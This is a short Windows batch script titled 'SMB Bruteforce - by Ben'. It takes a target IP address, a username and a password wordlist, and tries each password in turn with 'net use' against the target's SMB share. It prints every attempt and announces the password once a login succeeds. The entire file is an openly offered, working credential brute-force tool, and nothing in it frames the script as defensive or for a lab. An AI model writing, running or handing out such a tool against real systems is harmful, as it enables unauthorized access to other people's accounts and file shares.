@echo off
title SMB Bruteforce - by Ben
color A
echo.
set /p ip="Enter IP adress: "
set /p user="Enter username: "
set /p wordlist="Enter Passlist: "

set /a count=1
for /f %%a in (%wordlist%) do (
	set pass=%%a
	call :attempt
)

echo Password not found
pause
exit

:sucess
echo.
echo password found: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo ATTEMPT %count%: %pass%
set /a count=%count%+1
if %errorlevel% EQU 0 goto sucess